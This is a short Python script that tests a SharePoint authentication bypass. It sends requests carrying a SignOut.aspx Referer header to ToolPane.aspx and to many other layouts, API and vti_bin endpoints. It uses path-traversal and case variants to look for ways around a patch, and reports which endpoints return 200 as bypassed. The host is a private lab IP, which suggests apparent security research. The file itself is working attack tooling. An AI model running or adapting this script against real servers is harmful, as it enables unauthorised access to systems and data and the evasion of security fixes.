#!/usr/bin/env python3
# Purpose: Test SignOut Referer authentication bypass on different endpoints
# Outcome: Find if the auth bypass works on endpoints other than ToolPane.aspx
# Based on: Patch analysis showing ToolPane.aspx specifically blocked

import requests

target = "http://10.10.10.166"

# Test different endpoints with SignOut.aspx Referer
bypass_tests = [
    # Original exploit target (should be blocked)
    ("/_layouts/15/ToolPane.aspx?DisplayMode=Edit", "Original ToolPane.aspx"),
    
    # Variations of ToolPane
    ("/_layouts/ToolPane.aspx?DisplayMode=Edit", "ToolPane.aspx without /15/"),
    ("/_layouts/15/toolpane.aspx?DisplayMode=Edit", "Lowercase toolpane.aspx"),
    ("/_layouts/15/ToolPane.aspx", "ToolPane without parameters"),
    ("/_layouts/15/../15/ToolPane.aspx", "Path traversal to ToolPane"),
    
    # Other layouts pages with SignOut Referer
    ("/_layouts/15/settings.aspx", "settings.aspx"),
    ("/_layouts/15/user.aspx", "user.aspx"),
    ("/_layouts/15/viewlsts.aspx", "viewlsts.aspx"),
    ("/_layouts/15/listedit.aspx", "listedit.aspx"),
    ("/_layouts/15/people.aspx", "people.aspx"),
    ("/_layouts/15/Picker.aspx", "Picker.aspx (CVE-2019-0604)"),
    ("/_layouts/15/quicklinks.aspx", "quicklinks.aspx (CVE-2020-1147)"),
    
    # API endpoints with SignOut Referer
    ("/_api/web/currentuser", "API currentuser"),
    ("/_api/web/siteusers", "API siteusers"),
    
    # vti_bin endpoints
    ("/_vti_bin/WebPartPages.asmx", "WebPartPages.asmx"),
    ("/_vti_bin/client.svc", "client.svc"),
]

signout_referer = "/_layouts/SignOut.aspx"

print("Testing SignOut Referer authentication bypass on various endpoints:\n")
print("="*80)

for endpoint, description in bypass_tests:
    url = f"{target}{endpoint}"
    headers = {
        "Host": "10.10.10.166",
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3",
        "Referer": signout_referer,
    }
    
    try:
        response = requests.get(url, headers=headers, allow_redirects=False, timeout=5)
        
        if response.status_code == 401:
            status = "🔒 BLOCKED (401)"
        elif response.status_code == 403:
            status = "🔒 FORBIDDEN (403)"
        elif response.status_code == 200:
            status = "✅ BYPASSED (200)"
        elif response.status_code in [301, 302]:
            status = f"↪️  REDIRECT ({response.status_code})"
        elif response.status_code == 404:
            status = "❌ NOT FOUND (404)"
        elif response.status_code == 500:
            status = "⚠️  ERROR (500)"
        else:
            status = f"❓ {response.status_code}"
        
        print(f"{status:25} | {description:30} | {endpoint}")
        
    except Exception as e:
        print(f"{'❌ TIMEOUT/ERROR':25} | {description:30} | {endpoint}")

print("\n" + "="*80)
print("KEY: ✅ = Auth bypassed, 🔒 = Auth required/blocked, ❌ = Not found")
